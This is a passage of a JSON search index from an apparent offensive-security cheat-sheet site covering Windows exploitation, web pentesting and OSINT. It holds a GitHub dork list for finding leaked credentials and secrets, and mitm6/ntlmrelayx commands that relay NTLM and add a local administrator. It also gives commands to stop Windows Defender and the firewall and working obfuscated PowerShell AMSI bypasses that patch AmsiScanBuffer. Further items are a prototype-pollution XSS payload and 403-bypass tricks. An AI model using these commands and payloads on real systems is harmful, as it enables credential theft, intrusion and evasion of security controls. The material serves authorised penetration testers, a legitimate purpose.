Ocean tugboat config | | HEROKU_API_KEY language:shell | Heroku api keys | | HEROKU_API_KEY language:json | Heroku api keys in json files | | filename:.netrc password | netrc that possibly holds sensitive credentials | | filename:_netrc password | netrc that possibly holds sensitive credentials | | filename:hub oauth_token | hub config that stores github tokens | | filename:robomongo.json | mongodb credentials file used by robomongo | | filename:filezilla.xml Pass | filezilla config file with possible user/pass to ftp | | filename:recentservers.xml Pass | filezilla config file with possible user/pass to ftp | | filename:config.json auths | docker registry authentication data | | filename:idea14.key | IntelliJ Idea 14 key, try variations for other versions | | filename:config irc_pass | possible IRC config | | filename:connections.xml | possible db connections configuration, try variations to be specific | | filename:express.conf path:.openshift | openshift config, only email and server thou | | filename:.pgpass | PostgreSQL file which can contain passwords | | filename:proftpdpasswd | Usernames and passwords of proftpd created by cpanel | | filename:ventrilo_srv.ini | Ventrilo configuration | | [WFClient] Password= extension:ica | WinFrame-Client infos needed by users to connect toCitrix Application Servers | | filename:server.cfg rcon password | Counter Strike RCON Passwords | | JEKYLL_GITHUB_TOKEN | Github tokens used for jekyll | | filename:.bash_history | Bash history file | | filename:.cshrc | RC file for csh shell | | filename:.history | history file (often used by many tools) | | filename:.sh_history | korn shell history | | filename:sshd_config | OpenSSH server config | | filename:dhcpd.conf | DHCP service config | | filename:prod.exs NOT prod.secret.exs | Phoenix prod configuration file | | filename:prod.secret.exs | Phoenix prod secret | | filename:configuration.php JConfig password | Joomla configuration file | | filename:config.php dbpasswd | PHP application database password (e.g., phpBB forum software) | | path:sites databases password | Drupal website database credentials | | shodan_api_key language:python | Shodan API keys (try other languages too) | | filename:shadow path:etc | Contains encrypted passwords and account information of new unix systems | | filename:passwd path:etc | Contains user account information including encrypted passwords of traditional unix systems | | extension:avastlic | Contains license keys for Avast! Antivirus | | extension:dbeaver-data-sources.xml | DBeaver config containing MySQL Credentials | | filename:.esmtprc password | esmtp configuration | | extension:json googleusercontent client_secret | OAuth credentials for accessing Google APIs | | HOMEBREW_GITHUB_API_TOKEN language:shell | Github token usually set by homebrew users | | xoxp OR xoxb | Slack bot and private tokens | | .mlab.com password | MLAB Hosted MongoDB Credentials | | filename:logins.json | Firefox saved password collection (key3.db usually in same repo) | | filename:CCCam.cfg | CCCam Server config file | | msg nickserv identify filename:config | Possible IRC login passwords | | filename:settings.py SECRET_KEY | Django secret keys (usually allows for session hijacking, RCE, etc) |"
},
{
	"uri": "/windows-systems/exploitation/ipv6/",
	"title": "IPv6",
	"tags": [],
	"description": "",
	"content": " Mitm6 # Resources https://github.com/fox-it/mitm6 https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/ https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/ https://systemadminspro.com/domain-attacks-getting-an-account/ https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/ https://blog.vonahi.io/taking-over-ipv6-networks/ https://intrinium.com/mitm6-pen-testing/ # mitm6 is a pentesting tool that exploits the default configuration of Windows to take over the default DNS server. # It does this by replying to DHCPv6 messages, providing victims with a link-local # IPv6 address and setting the attackers host as default DNS server # When using mitm6, it issues a DHCPv6 lease to clients that last for a period of 300 seconds (or 5 minutes) # Due to this, it\u0026#39;s possible that several DNS queries will actually fail, resulting in clients # not being able to access services that rely on DNS names. # You can, however, change this in the source code. # Gonna create a fake DNS server for targets $ sudo mitm6 -d lab.local \nUsing with SMB server # First shell $ sudo mitm6 -i eth0 # Second shell $ smbserver.py SHARE_NAME path/to/share \nUsing with Responder # First shell $ sudo mitm6 -i eth0 # Second shell $ responder -I eth0 -wFv \nUsing with ntlmrelayx # First attacking shell $ sudo mitm6 -hw icorp-w10 -d internal.corp --ignore-nofqnd# Second attacking shell $ ntlmrelayx.py -t ldaps://icorp-dc.internal.corp -wh attacker-wpad --delegate-access # wh == server hosting WPAD (attacking IP) # t == target for relay # i == open interactive shell $ ntlmrelayx.py -wh 192.168.218.129 -t smb://192.168.218.128/ -i # Or $ ntlmrelayx.py -ip 0.0.0.0 -t rpc://example.local -c \u0026#34;net user xuser xpass /add \u0026amp;\u0026amp; net localgroup Administrators xuser /add\u0026#34;"
},
{
	"uri": "/phishing-redteam-and-se/",
	"title": "Phishing, RedTeam and SE",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/windows-systems/privilege-escalation/windows_defender/",
	"title": "Windows Defender",
	"tags": [],
	"description": "",
	"content": " Start/Stop # Requires admin privileges or being able to run a custom powershell sudo ! (sudo.ps1) powershell -ExecutionPolicy ByPass -command \u0026#34;\u0026amp; { . C:\\Users\\Username\\AppData\\Local\\Temp\\sudo_PS1-0.ps1; }\u0026#34; # Stop Windows Defender using cmd.exe sc stop WinDefend # Identify firewall profiles for an user netsh advfirewall show allprofiles # Disable all firewall profiles for an user netsh advfirewall set allprofiles state off # Totally disable the firewall netsh firewall set opmode disable \nBypass # SigThief allow to sign a payload binary # by stealing a legit signature https://github.com/secretsquirrel/SigThief \nDownloading https://twitter.com/mohammadaskar2/status/1301263551638761477?s=19 # You can download a file using Windows Defender itself C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.2008.9-0\\MpCmdRun.exe -url \u0026lt;url\u0026gt; -path \u0026lt;local-path\u0026gt;"
},
{
	"uri": "/network/services-enumeration/143_imap/",
	"title": "143 - IMAP",
	"tags": [],
	"description": "",
	"content": " Identification and Scans # Nmap scan nmap -v -sV --version-intensity=5 --script imap-capabilities -p T:143 \u0026lt;IP\u0026gt; # Banner grabbing telnet \u0026lt;IP\u0026gt; 143 # Banner grabbing and test connection nc -nv IP 143 A1 LOGIN “root” “” A1 LOGIN root toor A1 LOGIN root root"
},
{
	"uri": "/windows-systems/privilege-escalation/azure_ad/",
	"title": "Azure AD",
	"tags": [],
	"description": "",
	"content": " Exploiting Password Hash Synchronisation (PHS) https://www.synacktiv.com/posts/pentest/azure-ad-introduction-for-red-teamers.html # The main target is the sync account # You can identify it using the description $ ldapsearch -H ldap://DC01.DOMAIN.LAN:389 -D \u0026#34;DOMAIN\\user\u0026#34; -w \u0026#34;****\u0026#34; -b \u0026#34;DC=DOMAIN,DC=LAN\u0026#34; \u0026#39;(description=*Azure*)\u0026#39; description # To exploit this, need local admin or ADSync service account # Can decrypt using C:\\Program Files\\Microsoft Azure AD Sync\\Binn\\mcrypt.dll # The default configuration of Azure AD Connect uses a SQL Server Express database # but a fully deployed SQL Server can also be used. # In that case, the connection string from the POC must be replaced by the following: # \u0026#34;Server=LocalHost;Database=ADSync;Trusted_Connection=True;\u0026#34;. https://blog.xpnsec.com/azuread-connect-for-redteam/"
},
{
	"uri": "/web-pentest/bug_bounty_tips/",
	"title": "Bug Bounty Tips",
	"tags": [],
	"description": "",
	"content": " General # This section will be mainly used to store information found on Twitter # About some bug bounty tips \u0026amp; web tricks \nPassword Reset https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1 # 1/ Include controlled mail as a second parameter # 2/ Bruteforce reset token # 3/ Try to use a reset token on another account # 4/ Try to figure out how token are generated \nPayloads # Top 25 XSS Dorks https://twitter.com/trbughunters/status/1276851918946603013/photo/1# E-mail fields are usually less sanitized or filtered # It can be a good candidate for payloads \n401\u0026frasl;403 Bypass https://twitter.com/h4x0r_dz/status/1317218511937261570/photo/1 # GET /api/getUser --\u0026gt; 403 # GET / + X-Original-URL : /api/GetUser --\u0026gt; 200 # GET /api/getUser --\u0026gt; 403 # GET / + Referer : https://site.com/api/GetUser --\u0026gt; 200 # or # GET /api/getUser + Referer : https://site.com/api/GetUser --\u0026gt; 200 \nAuthorization checks # Authorization checks made easy with Firefox Containers # and Authorize extension https://blog.rootrwx.com/post/2021-01-11-auth-checks-made-easy/"
},
{
	"uri": "/open-source-intelligence-osint/platforms-hunting/reddit/",
	"title": "Reddit",
	"tags": [],
	"description": "",
	"content": " Basics https://www.secjuice.com/reddit-osint-techniques/\nUsername/Picture # Username and profile picture can help to identify cross platforms accounts # Banner too \nPosts # Topic is a thread where the user is the original poster (Known as OP) # Get topics for an user https://www.reddit.com/user/REPLACEWITHUSERNAME/posts/ # Pay attention to the subreddits # It can give information about interests # Comments https://www.reddit.com/user/REPLACEWITHUSERNAME/comments/# Deleted content # You can use services like removeddit to check for deleted content # Original thread https://www.reddit.com/r/algotrading/comments/cr7jey/ive_reproduced_130_research_papers_about/ # Deleted content https://www.removeddit.com/r/algotrading/comments/cr7jey/ive_reproduced_130_research_papers_about/ https://www.ceddit.com/r/algotrading/comments/cr7jey/ive_reproduced_130_research_papers_about/ # Colors indicates if removed by user or moderator # Username may not be visible on the online version but could be on removed content# Flairs can provide additional informations # A user’s flair differs depending on how it is set up within each subreddit they post within Profile # Display name can be changed over time # Can be good to check/monitor# Karma points are upvote/downvote given by people on topic/comments # Some subreddits may be difficult to post in with negative karma # Negative Karma can be usefull to identify troll accounts# Cake day is the creation day for each accounts # Recent cake day + bad karma can be troll accounts# Trophies https://www.reddit.com/trophies# Connected accounts can be available # Twitter mostly# Moderators of these communities # Most of the time # - Forums the user have created # - Forums the user have invested LOT of time in"
},
{
	"uri": "/wireless/",
	"title": "Wireless",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/sn0int/",
	"title": "sn0int",
	"tags": [],
	"description": "",
	"content": " Getting Started # Documentation https://github.com/kpcyrd/sn0int https://sn0int.readthedocs.io # Registry https://sn0int.com/ # Default, no modules installed # Quick install \u0026gt; pkg quickstart \u0026gt; pkg --help # Scopes \u0026gt; workspace demo \u0026gt; add domain Domain : domain.com # Confirm \u0026gt; select domains \u0026gt; select domains where id=1 \u0026gt; select domains where value like %.com \u0026gt; select domains where ( value like e% and value like %m ) or false # Modules # Informations gathered by modules can be picked up by others \u0026gt; pkg list # Certificate transparency \u0026gt; use ctlogs \u0026gt; run # DNS \u0026gt; use dns-resolve \u0026gt; run # Scan for discovered URLs \u0026gt; use url-scan \u0026gt; target \u0026gt; target where resolvable \u0026gt; run \u0026gt; select urls \nUnscoping entities # Unscopping entities # Modules are greedy and add inscope things you don\u0026#39;t want # You can delete it, but it can still be picked up by other modules # Or you can set specific flags on that entity \u0026gt; target \u0026gt; noscope domains where value=google.com \u0026gt; target # Reverse behavior \u0026gt; scope domains where true # Autonoscope # You can define rules to auto-unscope items [sn0int][demo] \u0026gt; # add the domain first [sn0int][demo] \u0026gt; # this is necessary because we only want to partially unscope example.com [sn0int][demo] \u0026gt; add domain example.com [sn0int][demo] \u0026gt; [sn0int][demo] \u0026gt; # automatically noscope all subdomains [sn0int][demo] \u0026gt; autonoscope add domain example.com [sn0int][demo] \u0026gt; # except subdomains of prod.example.com [sn0int][demo] \u0026gt; autoscope add domain prod.example.com [sn0int][demo] \u0026gt; [sn0int][demo] \u0026gt; autonoscope list scope domain \u0026#34;prod.example.com\u0026#34; noscope domain \u0026#34;example.com\u0026#34; [sn0int][demo] \u0026gt; [sn0int][demo] \u0026gt; # this is going to be out-of-scope [sn0int][demo] \u0026gt; add subdomain www.example.com [sn0int][demo] \u0026gt; # this is going to be in-scope [sn0int][demo] \u0026gt; add subdomain db.prod.example.com [sn0int][demo] \u0026gt; [sn0int][demo] \u0026gt; select subdomains #1, \u0026#34;www.example.com\u0026#34; #2, \u0026#34;db.prod.example.com\u0026#34; [sn0int][demo] \u0026gt; select subdomains where unscoped=0 #2, \u0026#34;db.prod.example.com\u0026#34; [sn0int][demo] \u0026gt; select subdomains where unscoped=1 #1, \u0026#34;www.example.com\u0026#34; [sn0int][demo] \u0026gt; # Autonoscope rules for domains are applied to domains, subdomains, urls # Autonoscope rules for IPs are applied to ipaddrs, netblocks, ports # Autonoscope rules for URLs are applied only to urls \nKeyring # Keyring [sn0int][default] \u0026gt; keyring add aws:AKIAIOSFODNN7EXAMPLE Secretkey: keep-this-secret [sn0int][default] \u0026gt; keyring list aws:AKIAIOSFODNN7EXAMPLE [sn0int][default] \u0026gt; [sn0int][default] \u0026gt; keyring list aws aws:AKIAIOSFODNN7EXAMPLE [sn0int][default] \u0026gt; keyring list instagram [sn0int][default] \u0026gt; [sn0int][default] \u0026gt; keyring get aws:AKIAIOSFODNN7EXAMPLE Namespace: \u0026#34;aws\u0026#34; Access Key: \u0026#34;AKIAIOSFODNN7EXAMPLE\u0026#34; Secret: \u0026#34;keep-this-secret\u0026#34; [sn0int][default] \u0026gt; \nStructs    Structure Attributes     Domains value   Subdomains value, domain_id, resolvable   IP value, family, continent, continent_code, country, city, latitude, longitude, asn, as_org, description, reverse_dns   URLs subdomain_id, value, status, body, online, title, redirect   Emails value, displayname, valid   Phonenumbers value, name, valid, last_online, country, carrier, line, is_ported, last_ported, caller_name, caller_type   Devices value, name, hostname, vendor, last_seen   Networks value, latitude, longitude, description   Accounts service, username, displayname, email, url, last_seen, birthday, phonenumber, profile_pic   Breaches value   Images value, filename, mime, width, height, created, latitude, longitude, nudity, ahash, dhash, phash   Ports ip_addr_id, ip_addr, port, status, banner, service, version   Netblocks family, value, asn, as_org, description   CryptoAddrs value, currency, denominator, balance, received, first_seen, last_withdrawal, description    \nModules # Registry contains all modules https://sn0int.com/ # Searching \u0026gt; pkg search patreon kpcyrd/patreon (0.1.0) - 17 downloads Collect information from patreon profiles # Install \u0026gt; pkg install kpcyrd/patreon [+] Installing kpcyrd/patreon [+] Loaded 51 modules"
},
{
	"uri": "/network/services-enumeration/161_162_snmp/",
	"title": "161/162 - SNMP",
	"tags": [],
	"description": "",
	"content": " Resources https://blog.cedrictemple.net/239-faire-des-requetes-snmp-en-ligne-de-commande-sous-linux/ \nIdentification \u0026amp; Scans nmap -vv -sV --version-intensity=5 -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes IP \nSnmpwalk snmpwalk -c public -v1 IP 1 \u0026gt; snmpwalk.txt Windows RUNNING PROCESSES 1.3.6.1.2.1.25.4.2.1.2 Windows INSTALLED SOFTWARE 1.3.6.1.2.1.25.6.3.1.2 Windows SYSTEM INFO 1.3.6.1.2.1.1.1 Windows HOSTNAME 1.3.6.1.2.1.1.5 Windows DOMAIN 1.3.6.1.4.1.77.1.4.1 Windows UPTIME 1.3.6.1.2.1.1.3 Windows USERS 1.3.6.1.4.1.77.1.2.25 Windows SHARES 1.3.6.1.4.1.77.1.2.27 Windows DISKS 1.3.6.1.2.1.25.2.3.1.3 Windows SERVICES 1.3.6.1.4.1.77.1.2.3.1.1 Windows LISTENING TCP PORTS 1.3.6.1.2.1.6.13.1.3.0.0.0.0 Windows LISTENING UDP PORTS 1.3.6.1.2.1.7.5.1.2.0.0.0.0 Linux RUNNING PROCESSES 1.3.6.1.2.1.25.4.2.1.2 Linux SYSTEM INFO 1.3.6.1.2.1.1.1 Linux HOSTNAME 1.3.6.1.2.1.1.5 Linux UPTIME 1.3.6.1.2.1.1.3 Linux MOUNTPOINTS 1.3.6.1.2.1.25.2.3.1.3 Linux RUNNING SOFTWARE PATHS 1.3.6.1.2.1.25.4.2.1.4 Linux LISTENING UDP PORTS 1.3.6.1.2.1.7.5.1.2.0.0.0.0 Linux LISTENING TCP PORTS 1.3.6.1.2.1.6.13.1.3.0.0.0.0 Community: admin manager public private \nOneSixtyOne # Scanning using onesixtyone (get existing communities) $ onesixtyone -c \u0026lt;dictCommunity.txt\u0026gt; -i \u0026lt;ip.txt\u0026gt;"
},
{
	"uri": "/windows-systems/privilege-escalation/amsi_and_evasion/",
	"title": "AMSI Bypass and Evasion",
	"tags": [],
	"description": "",
	"content": " Resources # AMSI Bypass Methods https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/amp/ https://www.contextis.com/us/blog/amsi-bypass https://fatrodzianko.com/2020/08/25/getting-rastamouses-amsiscanbufferbypass-to-work-again/ # DLL Hijacking https://sensepost.com/blog/2020/resurrecting-an-old-amsi-bypass/ # AMSI Bypass generator https://amsi.fail/ \nAMSI Bypass Methods # Methods pulled from the previous mentionned resources # More details on the resources # 1. Powershell Downgrade # Older version of powershell doesn\u0026#39;t use AMIS powershell -version 2# 2. Base64 Encoding # Original AMSI Bypass PS\u0026gt; [Ref].Assembly.GetType(\u0026#39;System.Management.Automation.AmsiUtils\u0026#39;).GetField(\u0026#39;amsiInitFailed\u0026#39;,\u0026#39;NonPublic,Static\u0026#39;).SetValue($null,$true) # Base64 encoded PS\u0026gt; [Ref].Assembly.GetType(\u0026#39;System.Management.Automation.\u0026#39;+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\u0026#39;QQBtAHMAaQBVAHQAaQBsAHMA\u0026#39;)))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\u0026#39;YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA==\u0026#39;))),\u0026#39;NonPublic,Static\u0026#39;).SetValue($null,$true)# 3. Hooking # The DLL needs to be injected into the PowerShell process which the AMSI bypass will performed .\\SimpleInjector.exe powershell.exe .\\AmsiHook.dll# 4. Memory Patching https://gist.github.com/am0nsec/986db36000d82b39c73218facc557628 PS\u0026gt; [System.Reflection.Assembly]::LoadFile(\u0026#34;C:\\Users\\pentestlab\\ASBBypass.dll\u0026#34;) PS\u0026gt; [Amsi]::Bypass() # But you might need to obfuscate some lines, displayed using this .\\AmsiTrigger_x64.exe -i .\\ASBBypass.ps1 # Obfuscation ${_/==\\_/\\__/===\\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\u0026#39;dQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABXAGkAbgAzADIAIAB7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAoAEkAbgB0AFAAdAByACAAaABNAG8AZAB1AGwAZQAsACAAcwB0AHIAaQBuAGcAIABwAHIAbwBjAE4AYQBtAGUAKQA7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAHMAdAByAGkAbgBnACAAbgBhAG0AZQApADsADQAKACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyACIAKQBdAA0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKABJAG4AdABQAHQAcgAgAGwAcABBAGQAZAByAGUAcwBzACwAIABVAEkAbgB0AFAAdAByACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABmAGwATgBlAHcAUAByAG8AdABlAGMAdAAsACAAbwB1AHQAIAB1AGkAbgB0ACAAbABwAGYAbABPAGwAZABQAHIAbwB0AGUAYwB0ACkAOwANAAoAfQA=\u0026#39;))) Add-Type ${_/==\\_/\\__/===\\_/} ${__/=\\/==\\/\\_/=\\_/} = [Win32]::LoadLibrary(\u0026#34;am\u0026#34; + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\u0026#39;cwBpAC4AZABsAGwA\u0026#39;)))) ${___/====\\__/=====} = [Win32]::GetProcAddress(${__/=\\/==\\/\\_/=\\_/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\u0026#39;QQBtAHMAaQA=\u0026#39;))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\u0026#39;UwBjAGEAbgA=\u0026#39;))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\u0026#39;QgB1AGYAZgBlAHIA\u0026#39;)))) ${/==\\_/=\\/\\__/\\/\\/} = 0 [Win32]::VirtualProtect(${___/====\\__/=====}, [uint32]5, 0x40, [ref]${/==\\_/=\\/\\__/\\/\\/}) ${_/\\__/=\\/\\___/==\\}= [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3) [System.Runtime.InteropServices.Marshal]::Copy(${_/\\__/=\\/\\___/==\\}, 0, ${___/====\\__/=====}, 6) # And then PS\u0026gt; .\\ASBBypass.ps1 # Another method is described here https://fatrodzianko.com/2020/08/25/getting-rastamouses-amsiscanbufferbypass-to-work-again/ https://www.contextis.com/us/blog/amsi-bypass# 5. Forcing an Error $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076) [Ref].Assembly.GetType(\u0026#34;System.Management.Automation.AmsiUtils\u0026#34;).GetField(\u0026#34;amsiContext\u0026#34;,\u0026#34;NonPublic,Static\u0026#34;).SetValue($null, [IntPtr]$mem) [Ref].Assembly.GetType(\u0026#34;System.Management.Automation.AmsiUtils\u0026#34;).GetField(\u0026#34;amsiSession\u0026#34;,\u0026#34;NonPublic,Static\u0026#34;).SetValue($null, $null); # Obfuscated version $fwi=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((9076+8092-8092));[Ref].Assembly.GetType(\u0026#34;System.Management.Automation.$([cHAr](65)+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))\u0026#34;).GetField(\u0026#34;$(\u0026#39;àmsìSessîõn\u0026#39;.NoRMALiZe([char](70+54-54)+[cHaR](111)+[cHar](114+24-24)+[chaR](106+3)+[chAR](68+26-26)) -replace [CHAR](24+68)+[chaR]([BytE]0x70)+[CHar]([bYtE]0x7b)+[cHAr](77+45-45)+[chaR](62+48)+[CHAR](125*118/118))\u0026#34;, \u0026#34;NonPublic,Static\u0026#34;).SetValue($null, $null);[Ref].Assembly.GetType(\u0026#34;System.Management.Automation.$([cHAr](65)+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))\u0026#34;).GetField(\u0026#34;$([char]([bYtE]0x61)+[ChaR]([BYte]0x6d)+[Char](55+60)+[chAr](105+97-97)+[CHAr]([byTe]0x43)+[ChaR](111+67-67)+[char]([BytE]0x6e)+[cHaR]([bYtE]0x74)+[cHAr](101)+[CHar](120)+[cHAR](116))\u0026#34;, \u0026#34;NonPublic,Static\u0026#34;).SetValue($null, [IntPtr]$fwi);# 6. Registry Key Modification # AMSI Providers are responsible for the scanning process by the antivirus product and are # registered in a location in the registry. The GUID for Windows Defender is displayed below HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE} # You can remove the key # Requires elevated privileges # Not a stealth move Remove-Item -Path \u0026#34;HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\u0026#34; -Recurse# 7. DLL Hijacking https://sensepost.com/blog/2020/resurrecting-an-old-amsi-bypass/ # Once the DLL is created # Executing PowerShell outside of the standard directory will load the amsi.dll file # which contains all the necessary functions to operate, however AMSI will not initiated. # Example C:\\Users\\myuser\\Documents\\amsi.dll C:\\Users\\myuser\\Documents\\powershell.exe WIP "
},
{
	"uri": "/cryptography/",
	"title": "Cryptography",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/web-pentest/misc_tricks/",
	"title": "MISC",
	"tags": [],
	"description": "",
	"content": " # Security Headers https://securityheaders.com # /!\\ HTTP POST Requests needs two carriage return at the end to be valid ! # Firefox extension for security https://addons.mozilla.org/fr/firefox/addon/hacktools/ \nQsreplace https://github.com/tomnomnom/qsreplace # Accept URLs on stdin, replace all query string values with a user-supplied value # only output each combination of query string parameters once per host and path. cat urls.txt | qsreplace newval https://example.com/path?one=newval\u0026amp;two=newval https://example.com/pathtwo?one=newval\u0026amp;two=newval https://example.net/a/path?one=newval\u0026amp;two=newval \nJSON Web Tokens (JWT) https://jwt.io/ # If RSA signed, you can try to set HS256 # You need to get the public key # By getting 2 tokens, you can calculate the public key # More info https://crypto.stackexchange.com/questions/62904/rsa-deduce-the-public-key-from-message-signed-message \nHTTP Methods # With this script, you can test various HTTP methods against an URL. # Cool and usefull tool by Shutdown for the recon phase https://github.com/ShutdownRepo/httpmethods HTTP Methods Tester, v1.0.2 usage: httpmethods.py [-h] -u URL [-v] [-q] [-k] [-w WORDLIST] [-t THREADS] [-j JSONFILE] This Python script can be used for HTTP verb tampering to bypass forbidden access, and for HTTP methods enumeration to find dangerous enabled methods like PUT optional arguments: -h, --help show this help message and exit -u URL, --url URL e.g. https://example.com:port/path -v, --verbose verbosity level (-v for verbose, -vv for debug) -q, --quiet Show no informations at all -k, --insecure Allow insecure server connections when using SSL (default: False) -w WORDLIST, --wordlist WORDLIST HTTP methods wordlist (default: default_wordlist.txt) -t THREADS, --threads THREADS Number of threads (default: 5) -j JSONFILE, --jsonfile JSONFILE Save results to specified JSON file. \nWorking on 403 Errors - Byp4xx # A bash script to bypass \u0026#34;403 Forbidden\u0026#34; responses with well-known methods discussed in #bugbountytips https://github.com/lobuhi/byp4xx ./byp4xx.sh [OPTIONS] http(s)://url/path OPTIONS: -c Return the entire curl command if response is 200 -r Redirects if the response is 3XX \nNIP IO / SSRF Redirections # Redirections / Bypass filters for SSRF # \u0026lt;anything\u0026gt;.\u0026lt;IP\u0026gt;.nip.io will redirect to the \u0026lt;IP\u0026gt; you specify 1.1.1.1.nip.io will resolve to 1.1.1.1 \nSpring Boot # Spring Boot / Metrics /metrics → Endpoint showing tons of endpoints /heapdump → Get a memory dump of the application Exploit → jhat -port 7401 -J-Xmx4G heapdump2016-12-27-13-54-live2196484565712626494.hprof \nVERB tampering # Test for others HTTP methods (verb tampering) # Bypass .htaccess curl -X COUCOU \u0026lt;target\u0026gt; \nInstall files # Install files # You can check for backup files using the following extensions .backup, .bck, .old, .save, .bak, .sav, ~, .copy, .old, .orig, .tmp, .txt, .back, .bkp, .bac, .tar, .gz, .tar.gz, .zip, .rar # Check headers # They often give informations curl -v \u0026lt;target\u0026gt; \nParameter override # If some JSON objects are in the response but not in the request # Try do add them in the request, you could override properties {\u0026#34;id\u0026#34;:\u0026#34;7\u0026#34;} =\u0026gt; {\u0026#34;id\u0026#34;:\u0026#34;7\u0026#34;, \u0026#34;admin\u0026#34;:false} {\u0026#34;id\u0026#34;:\u0026#34;7\u0026#34;, \u0026#34;admin\u0026#34;:true} =\u0026gt; {\u0026#34;id\u0026#34;:\u0026#34;7\u0026#34;, \u0026#34;admin\u0026#34;:true} \nO365 Testing ```bash # If facing OWA applications, you can check if the target is using O365 or on premise applications # If the following is \u0026#34;Managed\u0026#34;, the targets uses o365 https://login.microsoftonline.com/getuserrealm.srf?login=targetemail@company.com\u0026amp;xml=1 \nPayload Transformations https://twitter.com/jobertabma/status/1257126413699670016 # Transformation tool https://github.com/jobertabma/transformations https://transformations.jobertabma.nl/ # It helps finding processes made to an input, given then output # Can be usefull for crafting \nPrototype Pollution # Resources https://labs.detectify.com/2021/06/08/what-is-a-prototype-pollution-vulnerability-and-how-does-page-fetch-help/ https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ # Payloads https://github.com/BlackFan/client-side-prototype-pollution # Example # The payload parameter pollutes the prototype, making it available on the messages object # The message parameter is used to choose our payload to be displayed ?__proto__[payload]=\u0026lt;img%20src%20onerror=alert(document.domain)\u0026gt;\u0026amp;message=payload # Another example ############# const user = { userid: 123 }; if (user.admin) { console.log(\u0026#39;You are an admin\u0026#39;); } ### Object.prototype.admin = true; const user = { userid: 123 }; if (user.admin) { console.log(\u0026#39;You are an admin\u0026#39;); // this will execute } ############# # Page-fetch can be used to detect prototype pollution https://github.com/detectify/page-fetch # Usage echo https://detectify.com | page-fetch GET https://detectify.com/ 200 text/html; charset=utf-8 GET https://detectify.com/site/themes/detectify/css/detectify.css?v=1619009098 200 text/css GET https://detectify.com/site/themes/detectify/img/detectify_logo_black.svg 200 image/svg+xml GET https://fonts.googleapis.com/css?family=Merriweather:300i 200 text/css; charset=utf-8 ... # Execute Javascript echo https://detectify.com | page-fetch -j \u0026#39;document.querySelector(\u0026#34;title\u0026#34;).innerText\u0026#39; | grep ^JS JS (https://detectify.com): Website vulnerability scanner - scan web assets | Detectify # Check for XSS vulnerability echo \u0026#39;http://poc-tools-storage.s3-website.eu-west-2.amazonaws.com/pp.html?__proto__[testparam]=testval\u0026#39; | page-fetch -j \u0026#39;window.testparam == \u0026#34;testval\u0026#34;? \u0026#34;vulnerable\u0026#34; : \u0026#34;not vulnerable\u0026#34;\u0026#39; | grep ^JS JS (http://poc-tools-storage.s3-website.eu-west-2.amazonaws.com/pp.html?__proto__[testparam]=testval): vulnerable"
},
{
	"uri": "/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/photon/",
	"title": "Photon",
	"tags": [],
	"description": "",
